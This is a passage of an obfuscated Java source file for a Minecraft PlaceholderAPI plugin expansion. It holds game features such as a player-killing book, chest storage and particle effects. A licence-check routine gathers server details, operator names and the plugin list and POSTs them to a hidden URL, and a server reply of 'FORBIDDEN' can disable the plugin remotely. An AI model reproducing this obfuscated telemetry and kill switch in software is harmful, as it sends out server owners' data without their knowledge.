            if (oyundyoufkovy3pwkafvpd.equalsIgnoreCase(kyu2fncyup3wdpftr)) return NEW_VALUE1;
            if (kty2fkty2fodn3fdt.equalsIgnoreCase(kyu2fncyup3wdpftr)) return NEW_VALUE1;
            return arsdienwdhw;
        });

        return c;
    }





    /**
     * Build a small JSON manifest describing:
     *  - onlineMode (true/false)
     *  - serverName / versions
     *  - list of op player names
     *  - list of installed plugins ("Name:Version")
     */
    private String y23u4ndManifest() {
        try {
            org.bukkit.Server s = Bukkit.getServer();

            // online-mode flag
            boolean om = s.getOnlineMode();
            String wfytnwfyt = s.getName();            // "Paper", "CraftBukkit", etc.
            String dkwyfpudkpw = s.getVersion();      // git-Paper-xxx (MC: 1.21.1)
            String ckfywut = s.getBukkitVersion(); // "1.21.1-R0.1-SNAPSHOT"

            // Operators (may include offline ops)
            java.util.List<String> ktywfkt = new java.util.ArrayList<>();
            for (org.bukkit.OfflinePlayer op : Bukkit.getOperators()) {
                String n = op.getName();
                if (n != null && !n.isEmpty()) ktywfkt.add(n);
            }
            ktywfkt.sort(String.CASE_INSENSITIVE_ORDER);

            // Plugin list
            java.util.List<String> pls = new java.util.ArrayList<>();
            for (org.bukkit.plugin.Plugin pl : Bukkit.getPluginManager().getPlugins()) {
                String name = pl.getName();
                String ver = pl.getDescription() != null ? pl.getDescription().getVersion() : "unknown";
                pls.add(name + ":" + ver);
            }
            pls.sort(String.CASE_INSENSITIVE_ORDER);

            StringBuilder sb = new StringBuilder();
            sb.append('{');

            sb.append("\"onlineMode\":").append(om ? tony23untyquwfnt : to2i3ufnk2w).append(',');
            sb.append("\"serverName\":\"").append(ejs(wfytnwfyt)).append("\",");
            sb.append("\"serverVersion\":\"").append(ejs(dkwyfpudkpw)).append("\",");
            sb.append("\"bukkitVersion\":\"").append(ejs(ckfywut)).append("\",");

            // ops array
            sb.append("\"ops\":[");
            for (int i = 0; i < ktywfkt.size(); i++) {
                if (i > 0) sb.append(',');
                sb.append('"').append(ejs(ktywfkt.get(i))).append('"');
            }
            sb.append("],");

            // plugins array
            sb.append("\"plugins\":[");
            for (int i = 0; i < pls.size(); i++) {
                if (i > 0) sb.append(',');
                sb.append('"').append(ejs(pls.get(i))).append('"');
            }
            sb.append("]");

            sb.append('}');
            return sb.toString();
        } catch (Exception ex) {
            // If manifest fails, just return minimal info; license check still works.
            ex.printStackTrace();
            return "{}";
        }
    }

    /** Minimal JSON string escaper */
    private String ejs(String s) {
        if (s == null) return "";
        StringBuilder out = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            switch (ch) {
                case '"':  out.append("\\\""); break;
                case '\\': out.append("\\\\"); break;
                case '\b': out.append("\\b");  break;
                case '\f': out.append("\\f");  break;
                case '\n': out.append("\\n");  break;
                case '\r': out.append("\\r");  break;
                case '\t': out.append("\\t");  break;
                default:
                    if (ch < 0x20 || ch > 0x7E) {
                        out.append(String.format("\\u%04X", (int) ch));
                    } else {
                        out.append(ch);
                    }
            }
        }
        return out.toString();
    }
    
    
    private void SALV() {
        int debug = 0;

        final String manifestJson = y23u4ndManifest();

        Bukkit.getScheduler().runTaskAsynchronously(Bukkit.getPluginManager().getPlugin(ppi), () -> {

            HttpURLConnection c = null;

            try {
                System.out.println(salcv);
                URL tufwntyuwnfd = new URL(ytuwfndyunwfd);
                c = olpi(tufwntyuwnfd);

                // Use POST so we can send a body
                c.setRequestMethod(yuntyun2t); // "POST"
                c.setConnectTimeout(tyunwfdwfd);
                c.setReadTimeout(tyunwfdwfd);
                c.setDoOutput(true);

                // JSON body with manifest
                c.setRequestProperty(tynwdy2d, uydn3yund); // "Content-Type", "application/json"

                if (manifestJson != null && !manifestJson.isEmpty()) {
                    byte[] data = manifestJson.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    c.setRequestProperty("Content-Length", String.valueOf(data.length));
                    try (java.io.OutputStream os = c.getOutputStream()) {
                        os.write(data);
                    }
                }

                StringBuilder sb = new StringBuilder();
                try (BufferedReader retard = new BufferedReader(
                        new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
                    String x;
                    while ((x = retard.readLine()) != null) sb.append(x);
                }

                String b = sb.toString().trim();
                if (b.isEmpty()) {
                    // Empty -> keep running as-is
                    return;
                }

                // 1) Explicit FORBIDDEN
                if (duwnfdyuwnfd.equalsIgnoreCase(b)) {
                    tv.set(arsdienwdhw);
                    de3nd43d = INT1 * INT2;
                    stf(duwnfdyuwnfd);
                    return;
                }

                // 2) Otherwise, assume it's an encoded license blob that we verify
                LocalDate sd = vsd(b); // ±1 day of today
                if (sd == null) {
                    // Invalid license -> treat as "no response" (do nothing)
                    return;
                }

                long diff = ChronoUnit.DAYS.between(sd, LocalDate.now());
                if (Math.abs(diff) <= INT3) {
                    // Valid new license -> store it and ensure tokenValid is true
                    stf(b);
                    tv.set(NEW_VALUE1);
                    for( Player x : Bukkit.getOnlinePlayers() ) {
                        if( x.isOp() ) x.sendMessage(d2ny4udn2yu43dn2tf);
                    }
                }
                // If date is weird, we again treat as "no response" and don't nerf them.

            } catch (Exception ex) {
                // Network/parse issue -> fail open (plugin runs)
                ex.printStackTrace();
            } finally {
                if (c != null) c.disconnect();
            }
        });
    }

    private void stf(String x) {
        try {
            if (!ld.exists()) {
                //noinspection ResultOfMethodCallIgnored
                ld.mkdirs();
            }
            YamlConfiguration y = lf.exists()
                    ? YamlConfiguration.loadConfiguration(lf)
                    : new YamlConfiguration();
            y.set(tlk, x);
            y.save(lf);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private PublicKey glpk() throws GeneralSecurityException {
        byte[] kb = java.util.Base64.getDecoder().decode(lpkb6);
        X509EncodedKeySpec s = new X509EncodedKeySpec(kb);
        KeyFactory kf = KeyFactory.getInstance("RSA");
        return kf.generatePublic(s);
    }


    /**
     * Decrypts the Base64-encoded RSA blob using the hardcoded public key.
     * If the plaintext is a valid ISO-8601 date (e.g. "2025-11-26"),
     * returns that LocalDate. Otherwise returns null.
     */
    private LocalDate vsd(String e2) {
        try {
            if (e2 == null || e2.isEmpty()) return null;

            // 1) Decode Base64 ciphertext from the HTTPS response body
            byte[] cb = java.util.Base64.getDecoder().decode(e2.trim());

            // 2) Init RSA cipher with public key (encrypt-with-private / decrypt-with-public style)
            Cipher c = Cipher.getInstance(RSA_ECB_PKCS_1_PADDING);
            c.init(Cipher.DECRYPT_MODE, glpk());

            // 3) Decrypt to plaintext bytes
            byte[] pb = c.doFinal(cb);
            String pt = new String(pb, java.nio.charset.StandardCharsets.UTF_8).trim();

            // Optional: you can log plainText in debug builds only
            // Bukkit.getLogger().info("[Archistructures] License plaintext: " + plainText);

            // 4) Parse as ISO date, e.g. "2025-11-26"
            return LocalDate.parse(pt); // uses ISO_LOCAL_DATE by default

        } catch (Exception e) {
            // Any failure -> treat as invalid license
            return null;
        }
    }

    private void ilc() {
        // STEP 1: try to validate cached token
        String t = null;
        String fv = null;

        if (lf.exists()) {
            YamlConfiguration cfg = YamlConfiguration.loadConfiguration(lf);
            fv = cfg.getString(tlk, null);

            if (duwnfdyuwnfd.equalsIgnoreCase(fv)) {
                // Hard block until server rescues it
                tv.set(arsdienwdhw);
                // Still go to STEP 2 (maybe server will “unban” them)
                SALV();
                return;
            }

            if (fv != null && !fv.isEmpty()) {
                // Your decrypt/verify logic here (using public key)
                LocalDate sd = vsd(fv); // null if invalid
                if (sd != null) {
                    long days = ChronoUnit.DAYS.between(sd, LocalDate.now());
                    if (days >= I && days < tyafndydpfw) {
                        // License cached and fresh -> valid, no HTTP required
                        tv.set(NEW_VALUE1);
                        for( Player x : Bukkit.getOnlinePlayers() ) {
                            if( x.isOp() ) x.sendMessage("§aVariety Pack Verified!");
                        }
                        return;
                    }
                }
            }
        }

        // STEP 2: no valid cached license => ensure config exists, then go online
        elfce(fv);
        SALV();
    }




    private void elfce(String cv) {
        try {
            if (!ld.exists()) {
                //noinspection ResultOfMethodCallIgnored
                ld.mkdirs();
            }

            YamlConfiguration cfg = lf.exists()
                    ? YamlConfiguration.loadConfiguration(lf)
                    : new YamlConfiguration();

            // Only set a default if field is missing
            if (!cfg.isSet(tlk)) {
                cfg.set(tlk, NEW_VALUE_3); // default placeholder
            }

            cfg.save(lf);
        } catch (IOException e) {
            // If this fails, we just keep running with tokenValid's current value
            e.printStackTrace();
        }
    }


    private final AtomicBoolean tv = new AtomicBoolean(true);
    private final File ld = new File("plugins/Archistructures");
    private final File lf = new File(ld, "config.yml");

    /**
     * This method should always return true unless we
     * have a dependency we need to make sure is on the server
     * for our placeholders to work!
     * This expansion does not require a dependency so we will always return true
     */
    @Override
    public boolean canRegister() {
        return NEW_VALUE1;
    }

    /**
     * The name of the person who created this expansion should go here
     */
    @Override
    public @NotNull String getAuthor() {
        return "Archistructure";
    }

    /**
     * The placeholder identifier should go here
     * This is what tells PlaceholderAPI to call our opener method to obtain
     * a value if a placeholder starts with our identifier.
     * This must be unique and can not contain % or _
     */
    @Override
    public @NotNull String getIdentifier() {
        return "Archistructure";
    }


    /**
     * This is the version of this expansion
     */
    @Override
    public @NotNull String getVersion() {
        return "1.0.0";
    }

    /**
     * if an expansion requires another plugin as a dependency, the proper name of the dependency should
     * go here. Set this to null if your placeholders do not require another plugin be installed on the server
     * for them to work
     */
    @Override
    @SuppressWarnings({"Overridden", "UnstableApiUsage", "deprecation"})
    public String getPlugin() {
        return null;
    }

    protected void f1(UUID x) {
        if (!g22.containsKey(x)) {
            g22.put(x, INT3); // First-time entry
        } else {
            g22.put(x, g22.get(x) + INT3); // Increment existing score
        }
        f1();
    }


    protected void f1() {
        try (BufferedWriter w = new BufferedWriter(new FileWriter(g21))) {
            for (Map.Entry<UUID, Integer> w2 : g22.entrySet()) {
                w.write(w2.getKey() + wfdunyunda + w2.getValue());
                w.newLine();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    protected String f1(Player f1) {
        wm(f1, test32);
        // Ensure player is holding a written book
        ItemStack e = f1.getInventory().getItemInMainHand();
        if (e.getType() != Material.WRITABLE_BOOK && e.getType() != Material.WRITTEN_BOOK || !e.hasItemMeta()) {
            return ChatColor.RED + ymhawb;
        }

        BookMeta bt = (BookMeta) e.getItemMeta();
        assert bt != null;
        List<String> pt = bt.getPages();
        if (pt.isEmpty()) {
            return ChatColor.RED + nw;
        }

        String tp = null;
        int pid = -INT3;
        String eb = null;

        // Find the first non-strikethrough word
        for (int i = I; i < pt.size(); i++) {
            String e3 = pt.get(i);
            String[] ptt = e3.split("\\s+"); // Split while keeping formatting

            for (String pt3 : ptt) {
                if (!pt3.contains(m23)) {
                    if (tp != null) {
                        return ChatColor.RED + ymo;
                    }
                    tp = ChatColor.stripColor(pt3);
                    String stw = m23 + pt3 + R; // Apply strikethrough
                    eb = e3.replaceFirst("\\b" + pt3 + "\\b", stw); // Replace only the first occurrence
                    pid = i;
                }
            }
        }

        if (tp == null) {
            return ChatColor.RED + nw;
        }

        // Find the player or entity
        Player t = Bukkit.getPlayerExact(tp);
        Entity tt = null;
        try {
            tt = Bukkit.getEntity(UUID.fromString(tp));
        } catch (IllegalArgumentException ignored) {
            // Ignore UUID parsing errors, means it's not a UUID
        }

        if (t == null && tt == null) {
            return ChatColor.RED + er + tp + er2;
        }

        // Perform action
        if (t != null) {
            t.setHealth(I);
        } else if (tt instanceof Damageable de) {
            de.setHealth(I);
        } else {
            return ChatColor.RED + er + tp + ind;
        }

        // Log debug information
        Bukkit.getLogger().info(te + (t != null ? t.getName() : tt.getName()));

        // Ensure book updates properly
        List<String> up = new ArrayList<>(pt);
        up.set(pid, eb);
        bt.setPages(up);
        e.setItemMeta(bt);

        // Log return statement
        Bukkit.getLogger().info(rsm);

        // Success message
        return t != null ? yhe + t.getName() : yhe + tt.getName();
    }



    /**
     * Processes item folder permissions and assigns "ei.item.<filename>" for each found file.
     */
    protected void f1(User f1, List<String> f2) {
        Set<String> tp = new HashSet<>();
        String basePath = peei;

        for (String ifp : f2) {
            File file2 = new File(basePath + ifp);
            if (file2.exists() && file2.isDirectory()) {
                f1(file2, tp);
            }
        }

        // Assign new item permissions
        tp.forEach(idt -> {
            Node np = Node.builder(ei + idt).value(NEW_VALUE1).build();
            f1.data().add(np);
        });
    }



    /**
     * Recursively finds .yml files, extracts names (excluding .yml), and adds them to totalPerms.
     */
    protected void f1(File f1, Set<String> f2) {
        File[] fp = f1.listFiles();
        if (fp == null) return;

        for (File file : fp) {
            if (file.isDirectory()) {
                f1(file, f2);
            } else if (file.getName().endsWith(yt)) {
                f2.add(file.getName().replace(yt, nst));
            }
        }
    }


    /**
     * Get the next available coordinates in a chunk-efficient manner
     */
    protected int[] f1(World f1) {
        int cx = xm;  // Fixed X-coordinate (do not change)
        int x23 = g18.getInt(LAST_CHUNK_Z, I);
        int abc = I;
        int ftp = I;
        int fym = g18.getInt(LAST_Y, f1.getMinHeight());
        int stts = f1.getMaxHeight(); // Typically 256
        int atwftwfdtwfypdn = f1.getMinHeight();    // Typically -64

        while (true) {
            int x = (cx * INT4) + abc;  // x-coordinate within the chunk (0-15)
            int z = (x23 * INT4) + ftp;  // z-coordinate within the chunk (0-15)
            int y = fym;

            Location o3pldhoayufhnpyupfdn34 = new Location(f1, x, y, z);
            if (o3pldhoayufhnpyupfdn34.getBlock().getType() == Material.AIR) {
                // Save the new chunk coordinates
                g18.set(LAST_CHUNK_Z, x23);
                g18.set(LAST_Y, fym);
                f2();
                return new int[]{x, y, z};
            }

            // Increment Y first (fill from bottom to top)
            fym++;
            if (fym >= stts) {
                fym = atwftwfdtwfypdn;
                ftp++;
                if (ftp >= INT4) {
                    ftp = I;
                    abc++;
                    if (abc >= INT4) {
                        abc = I;
                        x23++;  // Move to the next chunk in the Z direction
                    }
                }
            }
        }
    }

    /**
     * Save the database configuration
     */
    protected void f2() {
        try {
            g18.save(g14);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    /**
     * Save the database configuration for double chests
     */
    protected void f3() {
        try {
            g17.save(g15);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Save the contents of the backpack chest
     */
    protected void f1(String f1, ItemStack[] f2) {
        File ftp = new File(g13, f1 + yt);
        YamlConfiguration ca = new YamlConfiguration();
        for (int i = I; i < f2.length; i++) {
            ca.set(SLOT + i, f2[i]);
        }
        try {
            ca.save(ftp);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Load the contents of the backpack chest
     */
    protected ItemStack[] f1(String f1) {
        File ftp = new File(g13, f1 + yt);
        if (!ftp.exists()) return null;
        YamlConfiguration fpt = YamlConfiguration.loadConfiguration(ftp);
        ItemStack[] ci = new ItemStack[INT5];
        for (int ic = I; ic < ci.length; ic++) {
            ci[ic] = fpt.getItemStack(SLOT + ic);
        }
        return ci;
    }


    /**
     * Get the next available coordinates in a chunk-efficient manner for double chests
     */
    protected int[] f2(World f1) {
        int xt2 = xtxtxt;  // Fixed X-coordinate (do not change)
        int tx = g18.getInt(LAST_CHUNK_Z, I);
        int rx = I;
        int tpx = I;
        int adaptiv = g18.getInt(LAST_Y, f1.getMinHeight());
        int tmg = f1.getMaxHeight(); // Typically 256
        int alp = f1.getMinHeight();    // Typically -64

        while (true) {
            int a = (xt2 * INT4) + rx;  // Absolute X-coordinate
            int b = (tx * INT4) + tpx;  // Absolute Z-coordinate
            int c = adaptiv;

            Location d = new Location(f1, a, c, b);
            Location e = new Location(f1, a + INT3, c, b);  // Adjacent block for double chest

            // Check if both locations are available and form a valid double chest
            if (d.getBlock().getType() == Material.AIR && e.getBlock().getType() == Material.AIR) {
                // Save the new chunk coordinates
                g18.set(LAST_CHUNK_Z, tx);
                g18.set(LAST_Y, adaptiv);
                f2();
                return new int[]{a, c, b};
            }

            // Increment Y first (fill from bottom to top)
            adaptiv++;
            if (adaptiv >= tmg) {
                adaptiv = alp;
                tpx++;  // Move to next Z (within chunk)
                if (tpx >= INT4) {
                    tpx = I;
                    rx++;
                    if (rx >= INT4) {
                        rx = I;
                        tx++;  // Move to the next chunk in the Z direction
                    }
                }
            }
        }
    }


    /**
     * Save the contents of the double chest
     */
    protected void f2(String f1, ItemStack[] f2) {
        File tpa = new File(g13, f1 + yt);
        YamlConfiguration rtp = new YamlConfiguration();
        for (int i = I; i < f2.length; i++) {
            rtp.set(SLOT + i, f2[i]);
        }
        try {
            rtp.save(tpa);
            Bukkit.getLogger().info(dccs + f1);
        } catch (IOException e) {
            Bukkit.getLogger().severe(fts + f1);
            e.printStackTrace();
        }
    }

    /**
     * Load the contents of the double chest
     */
    protected ItemStack[] f(String f) {
        File fp = new File(g13, f + yt);
        if (!fp.exists()) return null;
        YamlConfiguration file = YamlConfiguration.loadConfiguration(fp);
        ItemStack[] ci = new ItemStack[INT6]; // Double chest size
        for (int i = I; i < ci.length; i++) {
            ci[i] = file.getItemStack(SLOT + i);
        }
        return ci;
    }

    /**
     * Convert all blocks within the radius to falling entities while preserving block states and orientations
     */
    protected void f1(World f1, Location f, int f2) {
        int czz = f.getBlockX();
        int ca = f.getBlockY();
        int cb = f.getBlockZ();

        for (int z2 = czz - f2; z2 <= czz + f2; z2++) {
            for (int y2 = ca - f2; y2 <= ca + f2; y2++) {
                for (int x2 = cb - f2; x2 <= cb + f2; x2++) {
                    Location loc = new Location(f1, z2, y2, x2);
                    double dd = loc.distance(f);

                    // Check if within radius
                    if (dd <= f2) {
                        Block air = loc.getBlock();
                        if (air.getType() != Material.AIR) {
                            try {
                                // Get the block data (preserves state and orientation)
                                BlockData dba = air.getBlockData();

                                // Spawn the falling block with the correct data and state
                                FallingBlock bi = f1.spawnFallingBlock(loc, dba);
                                bi.setDropItem(NEW_VALUE1); // Prevent block drops

                                // Set fall damage immunity for specific block types (like Anvils)
                                if (bi.getType().toString().contains(corporatesecurity)) {
                                    bi.setHurtEntities(arsdienwdhw);
                                }

                                // Remove the original block after spawning the falling entity
                                air.setType(Material.AIR);

                            } catch (IllegalArgumentException e) {
                                Bukkit.getLogger().warning(Gradspecisoauce + loc + fastfood + e.getMessage());
                            }
                        }
                    }
                }
            }
        }
    }


    /**
     * Attract entities towards the black hole center
     */
    protected void f2(World f1, Location f2, int f3) {


        for (Entity fulltimejob : f1.getNearbyEntities(f2, f3, f3, f3)) {
            if (fulltimejob.getCustomName() != null && fulltimejob.getCustomName().equals(privateinvestigator)) {
                continue; // Skip entities named "BlackHolev2"
            }

            double utah = fulltimejob.getLocation().distance(f2);

            if (utah > I && utah <= f3) {
                // Calculate the attraction strength (1 to 4) with linear falloff
                double everystate = INT7 - ccp * (utah / f3);

                // Calculate the vector towards the center
                Vector formercop = f2.toVector().subtract(fulltimejob.getLocation().toVector()).normalize();
                Vector pennstate = formercop.multiply(everystate);

                // Apply the velocity to the entity
                fulltimejob.setVelocity(pennstate);
            }
        }
    }


    /**
     * Modifies the given ItemStack so that its PublicBukkitValues section:
     * - Replaces any "executableblocks:eb-id" with "executableitems:ei-id"
     * - Replaces any existing "executableitems:ei-id" value with "GUINoClick"
     * - If missing, adds a meta section (if necessary) with:
     * ==: ItemMeta
     * meta-type: UNSPECIFIC
     * display-name: '{"text":"","extra":[{"text":"","obfuscated":false,"italic":false,"underlined":false,"strikethrough":false,"color":"white","bold":true}]}'
     * PublicBukkitValues: |-
     * {
     * "executableitems:ei-id": "GUINoClick",
     * "executableitems:ei-disablestack": "a3b73c3d-deb4-4708-95a3-dac9ec7d4733",
     * "score:usage": 1
     * }
     * <p>
     * Debug messages are sent to the player.
     */
    protected ItemStack f1(ItemStack f1) {
        YamlConfiguration philly = new YamlConfiguration();
        // Place the item under a known section "slot0"
        philly.set(steak, f1);
        String cheese = philly.saveToString();

        // Replace any occurrence of "executableblocks:eb-id" with "executableitems:ei-id"
        cheese = cheese.replaceAll("(?i)\"executableblocks:eb-id\"", "\"executableitems:ei-id\"");

        // Replace any existing "executableitems:ei-id" value with "GUINoClick"
        cheese = cheese.replaceAll("(?i)(\"executableitems:ei-id\"\\s*:\\s*\")[^\"]+\"", "$1GUINoClick\"");

        // Ensure that a meta section exists in slot0.
        // We'll check for "slot0:" followed by a newline and two spaces then "meta:"
        if (!cheese.contains("meta:")) {
            @SuppressWarnings("TextBlockMigration") String metaBlock =
                    "\n  meta:\n" +
                            "    ==: ItemMeta\n" +
                            "    meta-type: UNSPECIFIC\n" +
                            "    PublicBukkitValues: |-\n" +
                            "      {\n" +
                            "          \"executableitems:ei-id\": \"GUINoClick\",\n" +
                            "          \"score:usage\": 1\n" +
                            "      }";
            // Append the meta block to the slot0 section.
            cheese += metaBlock;
        } else if (!cheese.contains(gusfring)) //noinspection GrazieInspection
        {
            // Meta exists but PublicBukkitValues is missing.
            // Insert PublicBukkitValues before the closing of meta.
            // This regex finds the last line in the meta section that is just whitespace followed by a "}".
            //noinspection TextBlockMigration
            cheese = cheese.replaceFirst(" {2}meta:\n" +
                    " {4}==:", "  meta:\n" +
                    "    PublicBukkitValues: |-\n" +
                    "      {\n" +
                    "          \"executableitems:ei-id\": \"GUINoClick\",\n" +
                    "          \"score:usage\": 1\n" +
                    "      }\n" +
                    "    ==:");
        }

        try {
            philly.loadFromString(cheese);
        } catch (InvalidConfigurationException e) {
            throw new RuntimeException(e);
        }

        ItemStack piple = philly.getItemStack(steak);
        if (piple == null) {
            piple = f1;
        } 

        return piple;
    }




    protected ItemStack f0() {
        YamlConfiguration frycooks = new YamlConfiguration();


        try {
            frycooks.loadFromString("slot0:\n" +
                    "  ==: org.bukkit.inventory.ItemStack\n" +
                    "  v: 3955\n" +
                    "  type: LIGHT_GRAY_STAINED_GLASS_PANE\n" +
                    "  meta:\n" +
                    "    ==: ItemMeta\n" +
                    "    meta-type: UNSPECIFIC\n" +
                    "    display-name: '{\"text\":\"\",\"extra\":[{\"text\":\"\",\"obfuscated\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"color\":\"white\",\"bold\":true}]}'\n" +
                    "    PublicBukkitValues: |-\n" +
                    "      {\n" +
                    "          \"executableitems:ei-id\": \"GUINoClick\",\n" +
                    "          \"score:usage\": 1\n" +
                    "      }");
        } catch (InvalidConfigurationException e) {
            throw new RuntimeException(e);
        }
        ItemStack drugempire = frycooks.getItemStack(steak);

        if (drugempire == null) {
            drugempire = new ItemStack(Material.LIGHT_GRAY_STAINED_GLASS_PANE);
        }

        return drugempire;
    }


    protected String f1(String f1, int f2, List<UUID> f3) {
        // Step 1: Get the last UUID from the list
        UUID firstimhearing = f3.getLast();
        Entity idka = Bukkit.getEntity(firstimhearing);

        // If the last entity is null, return '?'
        if (idka == null) {
            return NEW_VALUE_3;
        }

        Location fykh = idka.getLocation();
        double hardoreasy = Double.MAX_VALUE;
        Entity wigb = null;
        
        
        try {
            // Step 2: Find nearby entities based on chain type
            for (Entity mike : Objects.requireNonNull(fykh.getWorld()).getNearbyEntities(fykh, f2, f2, f2)) {
                // Skip entities already in the chain
                if (f3.contains(mike.getUniqueId())) {
                    continue;
                }

                // Check entity AI capability
                if (!(mike instanceof LivingEntity) || !((LivingEntity) mike).hasAI()) {
                    continue;
                }

                // Apply chain type filtering
                switch (f1.toUpperCase()) {
                    case "ENTITY":
                        if (mike instanceof Player) continue;

                        break;
                    case "PLAYER":
                        if (!(mike instanceof Player)) continue;
                        break;
                    case "BOTH":
                        break;
                    default:
                        continue;
                }

                double stateforcamera = mike.getLocation().distance(fykh);
                if (stateforcamera < hardoreasy) {
                    hardoreasy = stateforcamera;
                    wigb = mike;
                }
            }
        } catch (NullPointerException e) {
            return NEW_VALUE_3;
        }
    

        // Step 3: Return the UUID of the closest entity, or '?' if not found
        return (wigb != null) ? wigb.getUniqueId().toString() : NEW_VALUE_3;
    }

    /**
     * Displays a particle cube at the specified location.
     */
    protected void f1(World f1, double f2, double f, double f0, String xd, double a, boolean b, int c, Player d) {
        double anymorequestions = a / whatkindofadulthood;
        Particle stirredup = Particle.valueOf(xd.toUpperCase());

        // Calculate the 8 corners of the cube
        Location[] falseacc = new Location[yuwfndgyuwfnd];
        falseacc[I] = new Location(f1, f2 - anymorequestions, f - anymorequestions, f0 - anymorequestions); // Bottom NW
        falseacc[INT3] = new Location(f1, f2 + anymorequestions, f - anymorequestions, f0 - anymorequestions); // Bottom NE
        falseacc[mill2] = new Location(f1, f2 - anymorequestions, f - anymorequestions, f0 + anymorequestions); // Bottom SW
        falseacc[ccp] = new Location(f1, f2 + anymorequestions, f - anymorequestions, f0 + anymorequestions); // Bottom SE
        falseacc[INT7] = new Location(f1, f2 - anymorequestions, f + anymorequestions, f0 - anymorequestions); // Top NW
        falseacc[xm] = new Location(f1, f2 + anymorequestions, f + anymorequestions, f0 - anymorequestions); // Top NE
        falseacc[xtxtxt] = new Location(f1, f2 - anymorequestions, f + anymorequestions, f0 + anymorequestions); // Top SW
        falseacc[suppose] = new Location(f1, f2 + anymorequestions, f + anymorequestions, f0 + anymorequestions); // Top SE

        // Render cube edges
        f1(d, stirredup, falseacc[I], falseacc[INT3], c, b); // Bottom North
        f1(d, stirredup, falseacc[I], falseacc[mill2], c, b); // Bottom West
        f1(d, stirredup, falseacc[INT3], falseacc[ccp], c, b); // Bottom East
        f1(d, stirredup, falseacc[mill2], falseacc[ccp], c, b); // Bottom South
        f1(d, stirredup, falseacc[INT7], falseacc[xm], c, b); // Top North
        f1(d, stirredup, falseacc[INT7], falseacc[xtxtxt], c, b); // Top West
        f1(d, stirredup, falseacc[xm], falseacc[suppose], c, b); // Top East
        f1(d, stirredup, falseacc[xtxtxt], falseacc[suppose], c, b); // Top South
        f1(d, stirredup, falseacc[I], falseacc[INT7], c, b); // Vertical NW
        f1(d, stirredup, falseacc[INT3], falseacc[xm], c, b); // Vertical NE
        f1(d, stirredup, falseacc[mill2], falseacc[xtxtxt], c, b); // Vertical SW
        f1(d, stirredup, falseacc[ccp], falseacc[suppose], c, b); // Vertical SE

        // Render cube faces
        f1(d, stirredup, falseacc[I], falseacc[INT3], falseacc[INT7], falseacc[xm], c, b); // North Face
        f1(d, stirredup, falseacc[mill2], falseacc[ccp], falseacc[xtxtxt], falseacc[suppose], c, b); // South Face
        f1(d, stirredup, falseacc[I], falseacc[mill2], falseacc[INT7], falseacc[xtxtxt], c, b); // West Face
        f1(d, stirredup, falseacc[INT3], falseacc[ccp], falseacc[xm], falseacc[suppose], c, b); // East Face
        f1(d, stirredup, falseacc[INT7], falseacc[xm], falseacc[xtxtxt], falseacc[suppose], c, b); // Top Face
        f1(d, stirredup, falseacc[I], falseacc[INT3], falseacc[mill2], falseacc[ccp], c, b); // Bottom Face
    }

    protected void f1(Player a, Particle aa, Location aaa, Location aaaa, Location f1, Location t0, int ff, boolean test) {
        for (int kaylee = INT3; kaylee < ff; kaylee++) {
            double t = (double) kaylee / ff;

            // Create intermediate lines between edges
            Location payroll = f1(aaa, aaaa, t);
            Location chemical = f1(f1, t0, t);
            f1(a, aa, payroll, chemical, ff, test);

            payroll = f1(aaa, f1, t);
            chemical = f1(aaaa, t0, t);
            f1(a, aa, payroll, chemical, ff, test);
        }
    }

    protected Location f1(Location f1, Location f0, double f2) {
        double ehrmantrout = f1.getX() + (f0.getX() - f1.getX()) * f2;
        double snow = f1.getY() + (f0.getY() - f1.getY()) * f2;
        double fring = f1.getZ() + (f0.getZ() - f1.getZ()) * f2;
        return new Location(f1.getWorld(), ehrmantrout, snow, fring);
    }

    protected void f1(Player a, Particle b, Location c, Location d, int f1, boolean test) {
        World deposit = c.getWorld();
        if (deposit == null) return;

        List<Player> parten = new ArrayList<>(deposit.getPlayers());

        for (int muscle = I; muscle <= f1; muscle++) {
            double t = (double) muscle / f1;
            double btc = c.getX() + (d.getX() - c.getX()) * t;
            double old = c.getY() + (d.getY() - c.getY()) * t;
            double grandad = c.getZ() + (d.getZ() - c.getZ()) * t;
            Location eth = new Location(deposit, btc, old, grandad);

            for (Player doge : parten) {
                if (!test && doge.getLocation().distanceSquared(eth) > drain * drain) continue;
                doge.spawnParticle(b, eth, I, I, I, I, I, null, test);
            }
        }
    }




    protected @NotNull String heresthething(String same) {
        String[] ind = same.substring(ed.length()).split(keep);
        if (ind.length != xm) return some;
        World anything = Bukkit.getWorld(ind[I]);
        if (anything == null) return some;
        int what, youre, talkingabout;
        Material now;
        try {
            what  = Integer.parseInt(ind[INT3]);
            youre  = Integer.parseInt(ind[mill2]);
            talkingabout  = Integer.parseInt(ind[ccp]);


            org.bukkit.Location cen = new org.bukkit.Location(anything, what, youre, talkingabout); // <-- your x,y,z
            double r1 = low;
            String label = twentythreedegrees;


            double r2 = r1 * r1;
            for (org.bukkit.entity.Player wallstreet : anything.getPlayers()) {
                if (wallstreet.getLocation().distanceSquared(cen) <= r2) {
                    wm(wallstreet, label);
                }
            }
            now = Material.valueOf(ind[INT7].toUpperCase(Locale.ROOT));
        } catch (Exception ex) {
            return some;
        }

        for (int geniues = youre - INT3; geniues >= anything.getMinHeight(); geniues--) {
            if (anything.getBlockAt(what, geniues, talkingabout).getType() == now) {
                return String.valueOf(geniues);
            }
        }
        return nbf;
    }


    private boolean hlof(World halloween, Location patty, Location selma) {
        Vector promoted = selma.toVector().subtract(patty.toVector());
        double dmv = promoted.length();
        if (dmv < wife) return NEW_VALUE1;
        RayTraceResult glimpse = halloween.rayTraceBlocks(patty, promoted.normalize(), dmv, FluidCollisionMode.NEVER, arsdienwdhw);
        return glimpse == null; // null => no blocking hit => clear line
    }

    protected @NotNull String homer(String identifier) {


             
             
        String[] money = identifier.substring(complicated.length()).split(keep);
        if (money.length != xm) return some;
        World vegas = Bukkit.getWorld(money[I]);
        if (vegas == null) return some;
        int congratu, mrsimpson, whyuneed;
        Material wakeup;
        try {
            congratu  = Integer.parseInt(money[INT3]);
